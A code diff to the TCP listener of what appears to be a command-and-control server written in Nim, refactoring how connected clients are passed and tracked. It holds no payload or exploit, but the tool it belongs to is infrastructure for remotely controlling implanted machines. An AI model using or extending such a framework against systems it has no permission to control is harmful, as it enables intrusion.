@@ -1,8 +1,8 @@
-import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64, ws
+import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64
 
 import ../types, ../logging, ../processMessage
 
-proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {.async.} =
+proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
   
   var msgS: string = ""
   var linesRecv: int = 0
@@ -13,7 +13,7 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {
     if line.len == 0:
       client.connected = false
       tcpSocket.socket.close()
-      cDisconnected(client, "client died")
+      cDisconnected(client[], "client died")
       continue
 
     inc linesRecv
@@ -21,9 +21,9 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {
     if linesRecv == 3:
       client.connected = false
       tcpSocket.socket.close()
-      cDisconnected(client, "too much data sent")
+      cDisconnected(client[], "too much data sent")
       for task in server.tasks:
-        if task.client == client:
+        if task.client == client[]:
           task.markAsCompleted(%*{ "error": "client sent too much data" })
       continue
 
@@ -80,12 +80,16 @@ proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.a
       tcpSocket = TCPSocket(
         socket: clientSocket,
         id: client.id,
-        netAddr: netAddr
+        netAddr: netAddr,
+        tcpListener: tcpServer
       )
+
+    var cRef = new(ref C2Client)
+    cRef[] = client
 
     server.clients.add(client)
     tcpServer.sockets.add(tcpSocket)
 
-    asyncCheck processMessages(server, tcpSocket, client)
+    asyncCheck processMessages(server, tcpSocket, cRef)
 
   infoLog $tcpServer & " stopped"
